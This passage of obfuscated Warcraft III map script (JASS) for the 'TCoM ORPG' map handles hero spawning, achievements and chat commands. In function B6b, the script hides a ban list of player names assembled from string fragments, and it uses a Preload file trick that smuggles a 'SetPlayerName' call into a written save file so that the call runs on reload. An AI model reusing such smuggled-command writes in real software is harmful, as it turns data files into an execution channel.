call SetUnitAbilityLevel(NL[2+2*Ma],$41313944,2)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303752 then
call ni(Hu,.14,.14,.14,.14,.14,14,"+200 стат, 14% к Экстрактам",200,200,200)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313944,3)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E30344A then
call ni(Hu,.17,.17,.17,.17,.17,17,"+250 стат, 17% к Экстрактам",250,250,250)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313944,4)
endif
call UnitAddAbility(MT[Ma],$41304648)
endfunction
function B6b takes nothing returns nothing
local unit ip=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(ip))
local string i2=SubString(PH,32,33)+SubString(PH,39,40)+SubString(PH,47,48)+SubString(PH,49,50)+SubString(PH,0,1)+SubString(PH,7,8)+SubString(PH,0,1)
local string i3=SubString(PH,47,48)+SubString(PH,39,40)+SubString(PH,47,48)+SubString(PH,27,28)+SubString(PH,47,48)+SubString(PH,39,40)+SubString(PH,3,4)+SubString(PH,31,32)+SubString(PH,11,12)+SubString(PH,63,64)+SubString(PH,63,64)+"2"
local string i4=SubString(PH,22,23)+SubString(PH,11,12)+SubString(PH,45,46)+SubString(PH,23,24)+SubString(PH,51,52)+SubString(PH,33,34)+SubString(PH,27,28)+SubString(PH,39,40)
local unit Mc
local location No
call DisplayTextToPlayer(Player(0),0,0, i2)
call DisplayTextToPlayer(Player(0),0,0, i3)
call DisplayTextToPlayer(Player(0),0,0, i4)
if OE[Ma]==i2 or OE[Ma]==i3 or OE[Ma]==i4 then
call RemoveUnit(ip)
endif
if IsUnitType(ip,UNIT_TYPE_HERO) then
if GetLocalPlayer()==GetOwningPlayer(ip) then
call Preloader("TCoM_ORPG\\anickname\\nick.sav")
if GetPlayerName(Player(15))=="noname" then
call PreloadGenClear()
call Preload("\")\ncall SetPlayerName(Player(15),\""+GetPlayerName(GetOwningPlayer(ip))+"\")\n//")
call PreloadGenEnd("TCoM_ORPG\\anickname\\nick.sav")
else
if GetPlayerName(Player(15))==OE[Ma] then
call SetPlayerName(Player(15),"noname")
else
call RemoveUnit(ip)
call SetPlayerName(Player(15),"noname")
endif
endif
endif
if GetUnitLevel(ip)<=2 then
call DisplayTextToPlayer(Player(Ma),.5,0,"Новенький в карте? Введите в чат |c00ffff00–help|r дабы пройти получить краткую информацию о основных системах TCoM ORPG")
endif
endif
if GetPlayerName(GetOwningPlayer(ip))=="Jeka_Pycckuu" then
set OD[Ma]="|c005a24f8"
endif
if IsUnitType(ip,UNIT_TYPE_HERO)==true then
set MT[Ma]=ip
if i5[Ma]!=true then
set i5[Ma]=true
call UnitAddAbility(ip,$41313041)
set MK=MK+1
call SetPlayerHandicapXP(Player(Ma),0.*.01)
if MK>=4 then
if not (GetPlayerName(Player(8))=="TCOM") then
set MK=4
endif
endif
call SetUnitAbilityLevel(IM,$41304243,MK)
call SetUnitAbilityLevel(IM,$41304244,MK)
call SetUnitAbilityLevel(IM,$53303050,MK)
call B6Z()
call TriggerRegisterUnitEvent(X2,ip,EVENT_UNIT_DAMAGED)
set Mc=CreateUnitAtLoc(Player(Ma),$65777370,OffsetLocation(Location(-15610,1555),0,-(100*Ma)),0)
if GetUnitLevel(ip)>=6 and GetUnitAbilityLevel(ip,$41314452)<1 then
call UnitAddAbility(ip,$41314452)
call SetUnitAbilityLevel(ip,$41314452,GetUnitLevel(ip)/5)
endif
set MT[Ma]=ip
call UnitAddAbility(MT[Ma],$41305839)
call SetPlayerAbilityAvailable(Player(Ma),$41305839,false)
set No=GetUnitLoc(MT[Ma])
if NL[2+2*Ma]==null then
set NL[2+2*Ma]=CreateUnitAtLoc(GetOwningPlayer(MT[Ma]),$6E303133,No,270.)
endif
call RemoveLocation(No)
set No=null
set Tm[Ma+1]=GetUnitLevel(MT[Ma])
set NJ[Ma+1]=GetPlayerState(Player(Ma),PLAYER_STATE_RESOURCE_GOLD)*3
set NK[Ma+1]=GetPlayerState(Player(Ma),PLAYER_STATE_RESOURCE_LUMBER)*3
set Ts[Ma+1]=true
set S2[Ma+1]=false
set S2[Ma+11]=true
set TD[Ma+1]=true
set Sw[Ma+1]=true
set S0[Ma+1]=true
call UnitAddAbility(ip,$41496432)
if GetUnitAbilityLevel(MT[Ma],$41313357)>=1 then
call nX(MT[Ma],$41313357,GetUnitAbilityLevel(MT[Ma],$41313357),false)
elseif GetUnitAbilityLevel(MT[Ma],$41314330)>=1 then
call nX(MT[Ma],$41314330,GetUnitAbilityLevel(MT[Ma],$41314330),false)
elseif GetUnitAbilityLevel(MT[Ma],$41314332)>=1 then
call nX(MT[Ma],$41314332,GetUnitAbilityLevel(MT[Ma],$41314332),false)
elseif GetUnitAbilityLevel(MT[Ma],$41314341)>=1 then
call nX(MT[Ma],$41314341,GetUnitAbilityLevel(MT[Ma],$41314341),false)
elseif GetUnitAbilityLevel(ip,$41313234)>=1 then
call nX(MT[Ma],$41313234,GetUnitAbilityLevel(MT[Ma],$41313234),false)
elseif GetUnitAbilityLevel(MT[Ma],$41313247)>=1 then
call nX(MT[Ma],$41313247,GetUnitAbilityLevel(MT[Ma],$41313247),false)
elseif GetUnitAbilityLevel(MT[Ma],$41314335)>=1 then
call nX(MT[Ma],$41314335,GetUnitAbilityLevel(MT[Ma],$41314335),false)
endif
endif
endif
if GetUnitLevel(ip)==75 then
set NL[2+2*Ma]=ip
endif
if GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(ip))],$41304648)<1 then
call B6a(ip)
endif
set ip=null
set Mc=null
endfunction
function B6c takes nothing returns nothing
local trigger io=CreateTrigger()
local region NM=CreateRegion()
local rect NN=GR
local timer Hc
local integer PK
call RegionAddRect(NM,NN)
call TriggerRegisterEnterRegion(io,NM,null)
call TriggerAddAction(io,function B6b)
set io=null
set NN=null
set NM=null
set Hc=CreateTimer()
set PK=GetHandleId(Hc)
if PK!=$10579E then
endif
set Hc=null
endfunction
function B6d takes nothing returns nothing
local integer L9=0
loop
if GetPlayerSlotState(Player(L9))==PLAYER_SLOT_STATE_PLAYING and GetPlayerController(Player(L9))==MAP_CONTROL_USER then
if GetUnitAbilityLevel(MT[L9],$41305052)>=1 or GetUnitAbilityLevel(MT[L9],$41305247)>=1 then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(MT[L9]))+"получил достижение |c0000ff00\"Играть, играть, играть!\"")
if GetUnitAbilityLevel(MT[L9],$41305235)>=1 then
call UnitRemoveAbility(MT[L9],$41305235)
call UnitAddAbility(MT[L9],$41305247)
else
call UnitAddAbility(MT[L9],$41305052)
endif
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
endfunction
function B6e takes nothing returns nothing
local integer L9=0
local integer i6=0
loop
if GetPlayerSlotState(Player(L9))==PLAYER_SLOT_STATE_PLAYING and GetPlayerController(Player(L9))==MAP_CONTROL_USER then
set i6=i6+1
endif
set L9=L9+1
exitwhen L9>7
endloop
if i6>=7 then
set L9=0
loop
if GetUnitAbilityLevel(MT[L9],$41305444)>=1 or GetUnitAbilityLevel(MT[L9],$41305557)>=1 then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(MT[L9]))+"получил достижение |c0000ff00\"Вместе веселей\"")
if GetUnitAbilityLevel(MT[L9],$41305138)>=1 then
call UnitRemoveAbility(MT[L9],$41305138)
call UnitAddAbility(MT[L9],$41305557)
else
call UnitAddAbility(MT[L9],$41305444)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
endif
endfunction
function B6f takes nothing returns nothing
local unit Nv=GetTriggerUnit()
local unit Hu=MT[GetPlayerId(GetOwningPlayer(Nv))]
local item MO=GetManipulatedItem()
if IsUnitType(Hu,UNIT_TYPE_HERO)==true then
if GetItemUserData(MO)==0 or GetItemUserData(MO)==GetPlayerId(GetOwningPlayer(Hu))+1 then
if GetItemTypeId(MO)==$74626172 and GetUnitAbilityLevel(Hu,$41314451)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Звездочёт\"")
call UnitAddAbility(Hu,$41314451)
elseif GetItemTypeId(MO)==$74666172 and GetUnitAbilityLevel(Hu,$41314450)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Ниндзя\"")
call UnitAddAbility(Hu,$41314450)
elseif GetItemTypeId(MO)==$6F666C67 and GetUnitAbilityLevel(Hu,$41314431)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Нас не оглушить!\"")
call UnitAddAbility(Hu,$41314431)
elseif GetItemTypeId(MO)==$746C756D and GetUnitAbilityLevel(Hu,$41314430)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Магия? Не, не слышали\"")
call UnitAddAbility(Hu,$41314430)
elseif GetItemTypeId(MO)==$49305845 and GetUnitAbilityLevel(Hu,$4131414A)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Неуловимый\"")
call UnitAddAbility(Hu,$4131414A)
elseif GetItemTypeId(MO)==$49305837 and GetUnitAbilityLevel(Hu,$41304C4B)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Свиточек\"")
call UnitAddAbility(Hu,$41304C4B)
elseif GetItemTypeId(MO)==$49305836 and GetUnitAbilityLevel(Hu,$41305556)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Проклятый\"")
call UnitAddAbility(Hu,$41305556)
elseif GetItemTypeId(MO)==$49305838 and GetUnitAbilityLevel(Hu,$41313733)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Каменнный\"")
call UnitAddAbility(Hu,$41313733)
elseif GetItemTypeId(MO)==$49305839 and GetUnitAbilityLevel(Hu,$4131354C)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Целитель\"")
call UnitAddAbility(Hu,$4131354C)
elseif GetItemTypeId(MO)==$49305843 and GetUnitAbilityLevel(Hu,$41314149)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Ловкость\"")
call UnitAddAbility(Hu,$41314149)
elseif GetItemTypeId(MO)==$49305133 and GetUnitAbilityLevel(Hu,$41305A51)<1 and GetUnitAbilityLevel(Hu,$41313037)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Праздничный настрой\"")
if GetUnitAbilityLevel(Hu,$41305A50)>=1 then
call UnitRemoveAbility(Hu,$41305A50)
call UnitAddAbility(Hu,$41313037)
else
call UnitAddAbility(Hu,$41305A51)
endif
elseif GetItemTypeId(MO)==$49304E45 and GetUnitAbilityLevel(Hu,$41305A53)<1 and GetUnitAbilityLevel(Hu,$41313043)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Гладиатор\"")
if GetUnitAbilityLevel(Hu,$41305A5A)>=1 then
call UnitRemoveAbility(Hu,$41305A5A)
call UnitAddAbility(Hu,$41313043)
else
call UnitAddAbility(Hu,$41305A53)
endif
elseif GetItemTypeId(MO)==$4930504A and GetUnitAbilityLevel(Hu,$41313036)<1 and GetUnitAbilityLevel(Hu,$41313042)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Растения во благо\"")
if GetUnitAbilityLevel(Hu,$41305A58)>=1 then
call UnitRemoveAbility(Hu,$41305A58)
call UnitAddAbility(Hu,$41313042)
else
call UnitAddAbility(Hu,$41313036)
endif
elseif IsUnitType(Hu,UNIT_TYPE_HERO)==true and GetItemTypeId(MO)==$4930474A then
set TY[GetPlayerId(GetOwningPlayer(Hu))]=TY[GetPlayerId(GetOwningPlayer(Hu))]+1
if TY[GetPlayerId(GetOwningPlayer(Hu))]>=3 and GetUnitAbilityLevel(Hu,$41305A50)<1 and GetUnitAbilityLevel(Hu,$41313037)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Я так просто не сдамся\"")
if GetUnitAbilityLevel(GetTriggerUnit(),$41305A51)>=1 then
call UnitRemoveAbility(Hu,$41305A51)
call UnitAddAbility(Hu,$41313037)
else
call UnitAddAbility(Hu,$41305A50)
endif
endif
elseif GetItemTypeId(MO)==$4930504E and GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41313033)<1 and GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41313038)<1 then
set Tb[GetPlayerId(GetOwningPlayer(Hu))]=Tb[GetPlayerId(GetOwningPlayer(Hu))]+1
if Tb[GetPlayerId(GetOwningPlayer(Hu))]>=7 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Прелестный читатель\"")
if GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41305A52)>=1 then
call UnitRemoveAbility(MT[GetPlayerId(GetOwningPlayer(Hu))],$41305A52)
call UnitAddAbility(MT[GetPlayerId(GetOwningPlayer(Hu))],$41313038)
else
call UnitAddAbility(MT[GetPlayerId(GetOwningPlayer(Hu))],$41313033)
endif
endif
elseif GetItemTypeId(MO)==$70686C74 then
if GetUnitAbilityLevel(Hu,$41314254)<1 then
call UnitAddAbility(Hu,$41314254)
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Сон для слабых\"")
endif
elseif GetItemTypeId(MO)==$73747265 then
if GetUnitAbilityLevel(Hu,$41304D44)<1 then
call UnitAddAbility(Hu,$41304D44)
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Рассечь!\"")
endif
elseif GetItemTypeId(MO)==$6C757265 then
if GetUnitAbilityLevel(Hu,$41313745)<1 then
call UnitAddAbility(Hu,$41313745)
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Темный ветер\"")
endif
elseif GetItemTypeId(MO)==$72756D70 then
if GetUnitAbilityLevel(Hu,$41313746)<1 then
call UnitAddAbility(Hu,$41313746)
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Возмездие\"")
endif
elseif GetItemTypeId(MO)==$73666F67 then
if GetUnitAbilityLevel(Hu,$41313747)<1 then
call UnitAddAbility(Hu,$41313747)
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"Неприкаянный\"")
endif
endif
endif
endif
set Hu=null
set MO=null
set Nv=null
endfunction
function B6g takes nothing returns nothing
if GetUnitLevel(GetTriggerUnit())==55 and GetUnitAbilityLevel(GetTriggerUnit(),$41313038)<1 and GetUnitAbilityLevel(GetTriggerUnit(),$41305A52)<1 then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(GetTriggerUnit()))+" получил достижение |c0000ff00\"Максимум\"")
if GetUnitAbilityLevel(GetTriggerUnit(),$41313033)>=1 then
call UnitRemoveAbility(GetTriggerUnit(),$41313033)
call UnitAddAbility(GetTriggerUnit(),$41313038)
else
call UnitAddAbility(GetTriggerUnit(),$41305A52)
endif
endif
endfunction
function B6h takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterTimerEventSingle(Hc,3600.)
call TriggerAddAction(Hc,function B6e)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterTimerEventSingle(Hc,10800.)
call TriggerAddAction(Hc,function B6d)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(Hc,function B6f)
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_HERO_LEVEL)
call TriggerAddAction(Hc,function B6g)
set Hc=null
endfunction
function B6i takes nothing returns boolean
if not (GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],$41305A57)>=1) then
return false
endif
return true
endfunction
function B6j takes nothing returns boolean
if GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],$41305A56)>=1 then
return true
endif
if GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],$41313039)>=1 then
return true
endif
return false
endfunction
function B6k takes nothing returns boolean
if not B6j() then
return false
endif
return true
endfunction
function B6l takes nothing returns boolean
if not (Rp[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))]>=1000) then
return false
endif
return true
endfunction
function B6m takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(PLAYER_NEUTRAL_AGGRESSIVE)) then
return false
endif
return true
endfunction
function B6n takes nothing returns boolean
if not (GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],$41305A56)>=1) then
return false
endif
return true
endfunction
function B6o takes nothing returns boolean
if GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],$41305A57)>=1 then
return true
endif
if GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],$41313039)>=1 then
return true
endif
return false
endfunction
function B6p takes nothing returns boolean
if not B6o() then
return false
endif
return true
endfunction
function B6q takes nothing returns boolean
if not (Rp[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))+20]>=10) then
return false
endif
return true
endfunction
function B6r takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305858)>=1) then
return false
endif
return true
endfunction
function B6s takes nothing returns nothing
if B6m() then
if B6l() then
if B6k() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetKillingUnit()))+" получил достижение |c0000ff00\"Убей их\"")
if B6i() then
call UnitRemoveAbilityBJ($41305A57,MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1])
call UnitAddAbilityBJ($41313039,MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1])
call UnitMakeAbilityPermanent(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],true,$41313039)
else
call UnitAddAbilityBJ($41305A56,MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1])
call UnitMakeAbilityPermanent(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],true,$41305A56)
endif
endif
else
endif
else
endif
if B6r() then
set Rp[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))+20]=Rp[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))+20]+1
if B6q() then
if B6p() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetKillingUnit()))+" получил достижение |c0000ff00\"Добытчик\"")
if B6n() then
call UnitRemoveAbilityBJ($41305A56,MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1])
call UnitAddAbilityBJ($41313039,MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1])
call UnitMakeAbilityPermanent(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],true,$41313039)
else
call UnitAddAbilityBJ($41305A57,MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1])
call UnitMakeAbilityPermanent(MT[GetConvertedPlayerId(GetOwningPlayer(GetKillingUnit()))-1],true,$41305A57)
endif
endif
else
endif
else
endif
endfunction
function B6t takes nothing returns nothing
set i7=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(i7,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(i7,function B6s)
endfunction
function B6u takes nothing returns nothing
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c00ffff00Убито врагов c монетой: |r"+I2S(Rp[GetConvertedPlayerId(GetTriggerPlayer())+20]))
endfunction
function B6v takes nothing returns nothing
set i8=CreateTrigger()
call TriggerRegisterPlayerChatEvent(i8,Player(0),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(1),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(2),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(3),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(4),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(5),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(6),"-gk",true)
call TriggerRegisterPlayerChatEvent(i8,Player(7),"-gk",true)
call TriggerAddAction(i8,function B6u)
endfunction
function B6w takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())!=Player(PLAYER_NEUTRAL_PASSIVE)) then
return false
endif
return true
endfunction
function B6x takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41313036)>=1) then
return false
endif
return true
endfunction
function B6y takes nothing returns boolean
if GetUnitAbilityLevel(GetTriggerUnit(),$41305A58)>=1 then
return true
endif
if GetUnitAbilityLevel(GetTriggerUnit(),$41313042)>=1 then
return true
endif
return false
endfunction
function B6z takes nothing returns boolean
if not B6y() then
return false
endif
return true
endfunction
function B60 takes nothing returns boolean
if not (Ro[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]>=50) then
return false
endif
return true
endfunction
function B61 takes nothing returns nothing
if B60() then
if B6z() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetTriggerUnit()))+" получил достижение |c0000ff00\"Смерть - лишь начало\"")
if B6x() then
call UnitRemoveAbilityBJ($41313036,GetTriggerUnit())
call UnitAddAbilityBJ($41313042,GetTriggerUnit())
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41313042)
else
call UnitAddAbilityBJ($41305A58,GetTriggerUnit())
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305A58)
endif
endif
else
endif
endfunction
function B62 takes nothing returns nothing
set i9=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(i9,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(i9,Condition(function B6w))
call TriggerAddAction(i9,function B61)
endfunction
function B63 takes nothing returns boolean
if not (GetUnitAbilityLevel(MT[TZ-1],$41305A59)>=1) then
return false
endif
return true
endfunction
function B64 takes nothing returns boolean
if not (GetPlayerState(ConvertedPlayer(TZ),PLAYER_STATE_RESOURCE_GOLD)>=140000) then
return false
endif
if not (GetPlayerSlotState(ConvertedPlayer(TZ))==PLAYER_SLOT_STATE_PLAYING) then
return false
endif
return true
endfunction
function B65 takes nothing returns boolean
if not (GetUnitAbilityLevel(MT[TZ-1],$41305A53)>=1) then
return false
endif
return true
endfunction
function B66 takes nothing returns boolean
if GetUnitAbilityLevel(MT[TZ-1],$41305A5A)>=1 then
return true
endif
if GetUnitAbilityLevel(MT[TZ-1],$41313043)>=1 then
return true
endif
return false
endfunction
function B67 takes nothing returns boolean
if not B66() then
return false
endif
return true
endfunction
function B68 takes nothing returns boolean
if not (GetPlayerState(ConvertedPlayer(TZ),PLAYER_STATE_RESOURCE_LUMBER)>=9000) then
return false
endif
if not (GetPlayerSlotState(ConvertedPlayer(TZ))==PLAYER_SLOT_STATE_PLAYING) then
return false
endif
return true
endfunction
function B69 takes nothing returns nothing
set TZ=1
loop
exitwhen TZ>8
if B64() then
if B63() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(ConvertedPlayer(TZ))+" получил достижение |c0000ff00\"Деньги - зло\"")
call UnitAddAbilityBJ($41305A59,MT[TZ-1])
endif
else
endif
if B68() then
if B67() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(ConvertedPlayer(TZ))+" получил достижение |c0000ff00\"Кровоносная Тварь\"")
if B65() then
call UnitRemoveAbilityBJ($41305A53,MT[TZ-1])
call UnitAddAbilityBJ($41313043,MT[TZ-1])
call UnitMakeAbilityPermanent(MT[TZ-1],true,$41313043)
else
call UnitAddAbilityBJ($41305A5A,MT[TZ-1])
call UnitMakeAbilityPermanent(MT[TZ-1],true,$41305A5A)
endif
endif
else
endif
set TZ=TZ+1
endloop
endfunction
function B7B takes nothing returns nothing
set jB=CreateTrigger()
call TriggerRegisterTimerEventPeriodic(jB,5.)
call TriggerAddAction(jB,function B69)
endfunction
function B7C takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D30)==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D33)==true) then
return false
endif
return true
endfunction
function B7D takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305052)>=1) then
return false
endif
return true
endfunction
function B7E takes nothing returns boolean
if GetUnitAbilityLevel(GetTriggerUnit(),$41305235)>=1 then
return true
endif
if GetUnitAbilityLevel(GetTriggerUnit(),$41305247)>=1 then
return true
endif
return false
endfunction
function B7F takes nothing returns boolean
if not B7E() then
return false
endif
return true
endfunction
function B7G takes nothing returns nothing
if B7F() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetTriggerUnit()))+" получил достижение |c0000ff00\"Стать бы гробовщиком\"")
if B7D() then
call UnitRemoveAbilityBJ($41305052,GetTriggerUnit())
call UnitAddAbilityBJ($41305247,GetTriggerUnit())
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305247)
else
call UnitAddAbilityBJ($41305235,GetTriggerUnit())
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305235)
endif
endif
endfunction
function B7H takes nothing returns nothing
set jC=CreateTrigger()
call TriggerRegisterEnterRectSimple(jC,EW)
call TriggerAddCondition(jC,Condition(function B7C))
call TriggerAddAction(jC,function B7G)
endfunction
function B7I takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304344)==true) then
return false
endif
if not (SS>=20) then
return false
endif
return true
endfunction
function B7J takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305444)>=1) then
return false
endif
return true
endfunction
function B7K takes nothing returns boolean
if GetUnitAbilityLevel(GetTriggerUnit(),$41305138)>=1 then
return true
endif
if GetUnitAbilityLevel(GetTriggerUnit(),$41305557)>=1 then
return true
endif
return false
endfunction
function B7L takes nothing returns boolean
if not B7K() then
return false
endif
return true
endfunction
function B7M takes nothing returns nothing
if B7L() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetTriggerUnit()))+" получил достижение |c0000ff00\"Скорострел\"")
if B7J() then
call UnitRemoveAbilityBJ($41305444,GetTriggerUnit())
call UnitAddAbilityBJ($41305557,GetTriggerUnit())
else
call UnitAddAbilityBJ($41305138,GetTriggerUnit())
endif
endif
endfunction
function B7N takes nothing returns nothing
set ay=CreateTrigger()
call TriggerRegisterEnterRectSimple(ay,Cy)
call TriggerAddCondition(ay,Condition(function B7I))
call TriggerAddAction(ay,function B7M)
endfunction
function B7O takes nothing returns nothing
local integer L9=0
loop
if RectContainsUnit(Ed,MT[L9])==true then
if not (GetUnitAbilityLevel(MT[L9],$41313032)>=1) then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(MT[L9]))+" получил достижение |c0000ff00\"Вождь Арахнидов\"")
call UnitAddAbility(MT[L9],$41313032)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
endfunction
function B7P takes nothing returns nothing
set jD=CreateTrigger()
call TriggerRegisterUnitEvent(jD,Lz,EVENT_UNIT_DEATH)
call TriggerAddAction(jD,function B7O)
endfunction
function B7Q takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6830334A then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6830334B then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6830334E then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6830334C then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6830334D then
return true
endif
return false
endfunction
function B7R takes nothing returns boolean
if not B7Q() then
return false
endif
return true
endfunction
function B7S takes nothing returns nothing
local unit Hu=GetKillingUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
set Ta[Ma]=Ta[Ma]+1
if Ta[Ma]>=5 then
if not (GetUnitAbilityLevel(MT[Ma],$41313034)>=1) then
call BJDebugMsg(GetPlayerName(GetOwningPlayer(Hu))+" получил достижение |c0000ff00\"На пути разрушения\"")
call UnitAddAbility(MT[Ma],$41313034)
endif
endif
set Hu=null
endfunction
function B7T takes nothing returns nothing
set jE=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(jE,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(jE,Condition(function B7R))
call TriggerAddAction(jE,function B7S)
endfunction
function B7U takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41313035)>=1) then
return false
endif
return true
endfunction
function B7V takes nothing returns boolean
if not (RectContainsUnit(Gm,GetTriggerUnit())==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304655)==true) then
return false
endif
return true
endfunction
function B7W takes nothing returns boolean
if not (RectContainsUnit(Gn,GetTriggerUnit())==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304C33)==true) then
return false
endif
